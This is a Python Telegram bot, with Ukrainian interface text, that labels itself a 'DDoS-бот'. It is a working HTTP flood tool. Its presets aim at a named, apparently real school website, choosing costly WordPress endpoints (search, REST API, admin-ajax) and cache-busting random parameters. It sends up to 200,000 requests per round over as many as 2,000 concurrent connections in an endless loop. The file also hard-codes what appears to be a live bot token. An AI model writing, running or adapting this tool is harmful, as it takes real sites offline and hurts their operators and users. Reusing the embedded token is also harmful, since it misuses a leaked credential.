import asyncio
import html
import random
import string
import time

import aiohttp
from aiogram import Bot, Dispatcher, F
from aiogram.client.default import DefaultBotProperties
from aiogram.filters import Command
from aiogram.types import (BotCommand, CallbackQuery, InlineKeyboardButton,
                           InlineKeyboardMarkup, Message)

# ================= НАЛАШТУВАННЯ =================
TOKEN = "8222950520:AAEaq44aO9J8oO7xs-vqKKF_N6CWGUEhG0M"

PRESETS = [
    ("Головна (важко: Yoast + БД)",    "https://214.school/?nc={r}"),
    ("Пошук WP (максимум) ⭐",         "https://214.school/?s={r}"),
    ("REST API posts (важко)",         "https://214.school/wp-json/wp/v2/posts?per_page=100&nc={r}"),
    ("admin-ajax (середньо)",          "https://214.school/wp-admin/admin-ajax.php?nc={r}"),
]
RECOMMENDED = 2  # номер рекомендованого пресета

DEFAULT_PACKETS = 1000
DEFAULT_THREADS = 400
UA = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
      "(KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36")
# ================================================

bot = Bot(token=TOKEN, default=DefaultBotProperties(parse_mode="HTML"))
dp = Dispatcher()

users: dict[int, dict] = {}
floods: dict[int, "Flood"] = {}
wizard: dict[int, dict] = {}


def esc(s):
    return html.escape(str(s))


def rnd(n=6):
    return "".join(random.choices(string.ascii_lowercase + string.digits, k=n))


def get_user(uid: int) -> dict:
    return users.setdefault(uid, {
        "target": PRESETS[RECOMMENDED - 1][1],
        "packets": DEFAULT_PACKETS,
        "threads": DEFAULT_THREADS,
    })


async def safe_edit(cq: CallbackQuery, text: str, kb=None):
    try:
        await cq.message.edit_text(text, reply_markup=kb)
    except Exception:
        pass


# ===================== ФЛУДЕР =====================

class Flood:
    def __init__(self, target: str, packets: int, threads: int):
        self.target = target
        self.packets = packets
        self.threads = threads
        self.stats = {"ok": 0, "fail": 0, "bytes": 0, "times": [], "codes": {}}
        self.started = time.perf_counter()
        self.round = 0
        self.running = False
        self.task = None
        self._stop = False

    async def _hit(self, session, sem):
        async with sem:
            url = self.target.replace("{r}", rnd())
            t0 = time.perf_counter()
            try:
                async with session.get(url) as resp:
                    body = await resp.read()
                ms = (time.perf_counter() - t0) * 1000
                self.stats["ok"] += 1
                self.stats["bytes"] += len(body)
                self.stats["times"].append(ms)
                if len(self.stats["times"]) > 60000:
                    self.stats["times"] = self.stats["times"][-30000:]
                self.stats["codes"][resp.status] = self.stats["codes"].get(resp.status, 0) + 1
            except asyncio.CancelledError:
                raise
            except asyncio.TimeoutError:
                self.stats["fail"] += 1
                self.stats["codes"]["timeout"] = self.stats["codes"].get("timeout", 0) + 1
            except Exception as e:
                self.stats["fail"] += 1
                name = type(e).__name__
                self.stats["codes"][name] = self.stats["codes"].get(name, 0) + 1

    async def _loop(self):
        connector = aiohttp.TCPConnector(limit=0, force_close=False)
        timeout = aiohttp.ClientTimeout(total=25)
        headers = {
            "User-Agent": UA,
            "Connection": "keep-alive",
            "Accept": "text/html,application/xhtml+xml,*/*;q=0.8",
            "Accept-Language": "uk,en;q=0.8",
        }
        self.running = True
        self.started = time.perf_counter()
        try:
            async with aiohttp.ClientSession(connector=connector, timeout=timeout,
                                             headers=headers) as session:
                while not self._stop:
                    self.round += 1
                    sem = asyncio.Semaphore(self.threads)
                    tasks = [self._hit(session, sem) for _ in range(self.packets)]
                    await asyncio.gather(*tasks)
        except asyncio.CancelledError:
            pass
        finally:
            self.running = False

    def start(self):
        self.task = asyncio.create_task(self._loop())

    async def stop(self):
        self._stop = True
        if self.task:
            self.task.cancel()
            try:
                await self.task
            except asyncio.CancelledError:
                pass
        self.running = False

    def report(self) -> str:
        el = max(time.perf_counter() - self.started, 0.001)
        total = self.stats["ok"] + self.stats["fail"]
        ts = sorted(self.stats["times"])
        avg = sum(ts) / len(ts) if ts else 0
        p95 = ts[int(len(ts) * 0.95)] if ts else 0
        head = "🟢 <b>ПРАЦЮЄ</b>" if self.running else "🔴 <b>ЗУПИНЕНО</b>"
        return "\n".join([
            head,
            f"🎯 Ціль: <code>{esc(self.target)}</code>",
            f"🧵 Потоків: <b>{self.threads}</b> | 📦 Пакетів/раунд: <b>{self.packets}</b>",
            f"🔁 Раунд: <b>{self.round}</b>",
            "",
            f"✅ Успішно: <b>{self.stats['ok']}</b>",
            f"❌ Провалено: <b>{self.stats['fail']}</b>",
            f"📦 Передано: <b>{self.stats['bytes'] / 1048576:.1f} MB</b>",
            f"⏱ Час: <b>{el:.0f} с</b>",
            f"⚡ Швидкість: <b>{total / el:.0f} зап/с</b>",
            f"📉 Відгук: <b>{avg:.0f} ms</b> (p95 {p95:.0f} ms)",
            f"🔢 Коди: <code>{esc(self.stats['codes'])}</code>",
        ])


# ==================== ТЕКСТИ Й КЛАВІАТУРИ ====================

def targets_text(u: dict) -> str:
    lines = ["<b>Цілі — тисни цифру або кнопку:</b>"]
    for i, (name, url) in enumerate(PRESETS, 1):
        star = " ⭐ рекомендовано" if i == RECOMMENDED else ""
        mark = "▶️ " if u["target"] == url else "▫️ "
        lines.append(f"{mark}<b>{i})</b> {name}{star}")
    if all(u["target"] != url for _, url in PRESETS):
        lines.append(f"\n🔗 Своя ціль: <code>{esc(u['target'])}</code>")
    return "\n".join(lines)


def summary(u: dict) -> str:
    return (f"🎯 Ціль: <code>{esc(u['target'])}</code>\n"
            f"📦 Пакетів/раунд: <b>{u['packets']}</b>\n"
            f"🧵 Потоків: <b>{u['threads']}</b>")


def main_text(u: dict, f: "Flood | None" = None) -> str:
    if f is not None:
        return f.report()
    return "🤖 <b>DDoS-бот</b>\n\n" + summary(u) + "\n\n" + targets_text(u)


def main_kb(running: bool) -> InlineKeyboardMarkup:
    rows = [
        [InlineKeyboardButton(text="1️⃣ Головна", callback_data="preset0"),
         InlineKeyboardButton(text="2️⃣ Пошук ⭐", callback_data="preset1")],
        [InlineKeyboardButton(text="3️⃣ REST", callback_data="preset2"),
         InlineKeyboardButton(text="4️⃣ admin-ajax", callback_data="preset3")],
    ]
    if running:
        rows.append([InlineKeyboardButton(text="⏹ ЗУПИНИТИ НАВАНТАЖЕННЯ", callback_data="stop")])
    else:
        rows.append([InlineKeyboardButton(text="🚀 ПОЧАТИ НАВАНТАЖЕННЯ", callback_data="start")])
    rows.append([
        InlineKeyboardButton(text="🛠 Покроково", callback_data="setup"),
        InlineKeyboardButton(text="⚙️ Ще", callback_data="settings"),
    ])
    return InlineKeyboardMarkup(inline_keyboard=rows)


def settings_kb(u: dict) -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text=f"📦 Пакетів/раунд: {u['packets']}", callback_data="noop")],
        [InlineKeyboardButton(text="➖ 500", callback_data="pk-500"),
         InlineKeyboardButton(text="➕ 500", callback_data="pk+500")],
        [InlineKeyboardButton(text=f"🧵 Потоків: {u['threads']}", callback_data="noop")],
        [InlineKeyboardButton(text="➖ 50", callback_data="th-50"),
         InlineKeyboardButton(text="➕ 50", callback_data="th+50")],
        [InlineKeyboardButton(text="⬅️ Назад", callback_data="back")],
    ])


def settings_text(u: dict) -> str:
    return ("⚙️ <b>НАЛАШТУВАННЯ</b>\n\n"
            f"📦 Пакетів за раунд: <b>{u['packets']}</b>\n"
            f"🧵 Одночасних потоків: <b>{u['threads']}</b>\n\n"
            "Команди:\n"
            "<code>/target URL</code>\n"
            "<code>/packets 1000</code>\n"
            "<code>/threads 400</code>\n"
            "<code>/check</code> — перевірити ціль\n\n"
            "<i>{r} у цілі — випадковий рядок (обхід кешу)</i>")


# ===================== ХЕНДЛЕРИ =====================

@dp.message(Command("start"))
async def cmd_start(m: Message):
    u = get_user(m.from_user.id)
    await m.answer(main_text(u), reply_markup=main_kb(False))


@dp.message(Command("check"))
async def cmd_check(m: Message):
    u = get_user(m.from_user.id)
    url = u["target"].replace("{r}", rnd())
    t0 = time.perf_counter()
    try:
        async with aiohttp.ClientSession() as s:
            async with s.get(url, headers={"User-Agent": UA},
                             timeout=aiohttp.ClientTimeout(total=20)) as r:
                body = await r.read()
        ms = (time.perf_counter() - t0) * 1000
        await m.answer(f"✅ Ціль відповідає\nHTTP <b>{r.status}</b> за <b>{ms:.0f} ms</b>, "
                       f"{len(body) / 1024:.0f} KB\n<code>{esc(url)}</code>")
    except Exception as e:
        await m.answer(f"❌ Ціль не відповідає: <code>{type(e).__name__}</code>")


@dp.message(Command("stop"))
async def cmd_stop(m: Message):
    f = floods.get(m.from_user.id)
    if not f or not f.running:
        await m.answer("Нічого не працює.")
        return
    await f.stop()
    await m.answer(f.report(), reply_markup=main_kb(False))


@dp.message(Command("target"))
async def cmd_target(m: Message):
    u = get_user(m.from_user.id)
    parts = m.text.split(maxsplit=1)
    if len(parts) < 2:
        await m.answer(f"Поточна ціль:\n<code>{esc(u['target'])}</code>\n\n"
                       "Змінити:\n<code>/target https://site.com/?s={{r}}</code>")
        return
    u["target"] = parts[1].strip()
    await m.answer(f"✅ Ціль встановлена:\n<code>{esc(u['target'])}</code>")


@dp.message(Command("packets"))
async def cmd_packets(m: Message):
    u = get_user(m.from_user.id)
    parts = m.text.split(maxsplit=1)
    if len(parts) < 2 or not parts[1].isdigit():
        await m.answer(f"Зараз: <b>{u['packets']}</b>. Приклад: <code>/packets 2000</code>")
        return
    u["packets"] = max(50, min(200000, int(parts[1])))
    await m.answer(f"📦 Пакетів/раунд: <b>{u['packets']}</b>")


@dp.message(Command("threads"))
async def cmd_threads(m: Message):
    u = get_user(m.from_user.id)
    parts = m.text.split(maxsplit=1)
    if len(parts) < 2 or not parts[1].isdigit():
        await m.answer(f"Зараз: <b>{u['threads']}</b>. Приклад: <code>/threads 800</code>")
        return
    u["threads"] = max(10, min(2000, int(parts[1])))
    await m.answer(f"🧵 Потоків: <b>{u['threads']}</b>")


@dp.callback_query(F.data.startswith("preset"))
async def cb_preset(cq: CallbackQuery):
    i = int(cq.data[6:])
    u = get_user(cq.from_user.id)
    u["target"] = PRESETS[i][1]
    f = floods.get(cq.from_user.id)
    await cq.answer(f"✅ Ціль {i + 1}")
    await safe_edit(cq, main_text(u, f), main_kb(bool(f and f.running)))


@dp.callback_query(F.data == "setup")
async def cb_setup(cq: CallbackQuery):
    wizard[cq.from_user.id] = {"step": "target"}
    await cq.message.edit_text(
        "🛠 <b>Покроково</b>\n\n<b>Крок 1/3.</b> Надішли URL сайту:\n"
        "Наприклад: <code>https://214.school/?s={{r}}</code>\n\n"
        "<i>Скасувати — /start</i>")
    await cq.answer()


@dp.callback_query(F.data == "start")
async def cb_start(cq: CallbackQuery):
    uid = cq.from_user.id
    old = floods.get(uid)
    if old and old.running:
        await cq.answer("Вже працює")
        return
    u = get_user(uid)
    f = Flood(u["target"], u["packets"], u["threads"])
    floods[uid] = f
    f.start()
    await cq.answer("🚀 Погнали")
    await safe_edit(cq, f.report(), main_kb(True))
    asyncio.create_task(live_updater(uid, cq.message.chat.id, cq.message.message_id, f))


@dp.callback_query(F.data == "stop")
async def cb_stop(cq: CallbackQuery):
    uid = cq.from_user.id
    f = floods.get(uid)
    if not f or not f.running:
        await cq.answer("Нічого не працює")
        return
    await f.stop()
    await cq.answer("⏹ Зупинено")
    await safe_edit(cq, f.report(), main_kb(False))


@dp.callback_query(F.data == "refresh")
async def cb_refresh(cq: CallbackQuery):
    f = floods.get(cq.from_user.id)
    if f:
        await safe_edit(cq, f.report(), main_kb(f.running))
    await cq.answer()


@dp.callback_query(F.data == "settings")
async def cb_settings(cq: CallbackQuery):
    u = get_user(cq.from_user.id)
    await safe_edit(cq, settings_text(u), settings_kb(u))
    await cq.answer()


@dp.callback_query(F.data == "back")
async def cb_back(cq: CallbackQuery):
    uid = cq.from_user.id
    f = floods.get(uid)
    await safe_edit(cq, main_text(get_user(uid), f), main_kb(bool(f and f.running)))
    await cq.answer()


@dp.callback_query(F.data == "noop")
async def cb_noop(cq: CallbackQuery):
    await cq.answer()


@dp.callback_query(F.data.startswith("pk"))
async def cb_packets(cq: CallbackQuery):
    u = get_user(cq.from_user.id)
    u["packets"] = max(50, min(200000, u["packets"] + int(cq.data[2:])))
    await safe_edit(cq, settings_text(u), settings_kb(u))
    await cq.answer()


@dp.callback_query(F.data.startswith("th"))
async def cb_threads(cq: CallbackQuery):
    u = get_user(cq.from_user.id)
    u["threads"] = max(10, min(2000, u["threads"] + int(cq.data[2:])))
    await safe_edit(cq, settings_text(u), settings_kb(u))
    await cq.answer()


# ОСТАННІЙ — ловить будь-який текст: цифри, URL, кроки майстра
@dp.message()
async def on_text(m: Message):
    uid = m.from_user.id
    txt = (m.text or "").strip()
    u = get_user(uid)

    w = wizard.get(uid)
    if w:
        step = w["step"]
        if step == "target":
            u["target"] = txt
            w["step"] = "packets"
            await m.answer("<b>Крок 2/3.</b> Скільки <b>пакетів за раунд</b>? "
                           "Наприклад: <code>1000</code>")
            return
        if step == "packets":
            if txt.isdigit():
                u["packets"] = max(50, min(200000, int(txt)))
            w["step"] = "threads"
            await m.answer("<b>Крок 3/3.</b> Скільки <b>одночасних потоків</b>? "
                           "Наприклад: <code>400</code>")
            return
        wizard.pop(uid, None)
        if txt.isdigit():
            u["threads"] = max(10, min(2000, int(txt)))
        await m.answer("✅ <b>Готово!</b>\n\n" + summary(u) + "\n\nТисни «Почати».",
                       reply_markup=main_kb(False))
        return

    if txt in ("1", "2", "3", "4"):
        i = int(txt) - 1
        u["target"] = PRESETS[i][1]
        await m.answer(f"✅ Ціль <b>{txt}</b>: {PRESETS[i][0]}\n\n" + summary(u),
                       reply_markup=main_kb(False))
        return

    if txt.startswith("http"):
        u["target"] = txt
        await m.answer(f"✅ Ціль встановлена:\n<code>{esc(txt)}</code>",
                       reply_markup=main_kb(False))
        return

    await m.answer("Не зрозумів 🤔 Тицяй /start")


# ================== ЖИВЕ ОНОВЛЕННЯ ==================

async def live_updater(uid: int, chat_id: int, msg_id: int, f: Flood):
    while f.running:
        await asyncio.sleep(3)
        try:
            await bot.edit_message_text(f.report(), chat_id=chat_id,
                                        message_id=msg_id, reply_markup=main_kb(f.running))
        except Exception:
            pass
    if floods.get(uid) is f:
        try:
            await bot.edit_message_text(f.report(), chat_id=chat_id,
                                        message_id=msg_id, reply_markup=main_kb(False))
        except Exception:
            pass


# ====================== ЗАПУСК ======================

async def main():
    me = await bot.get_me()
    print(f"✅ Токен робочий. Бот: @{me.username} ({me.first_name})")

    await bot.set_my_commands([
        BotCommand(command="start", description="Меню + цілі"),
        BotCommand(command="stop", description="Зупинити навантаження"),
        BotCommand(command="check", description="Перевірити ціль"),
        BotCommand(command="target", description="Своя ціль"),
        BotCommand(command="packets", description="Пакетів за раунд"),
        BotCommand(command="threads", description="Одночасних потоків"),
    ])
    await bot.delete_webhook(drop_pending_updates=True)
    print("🚀 Полінг запущено. Ctrl+C для виходу.")
    await dp.start_polling(bot)


if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("\nВихід.")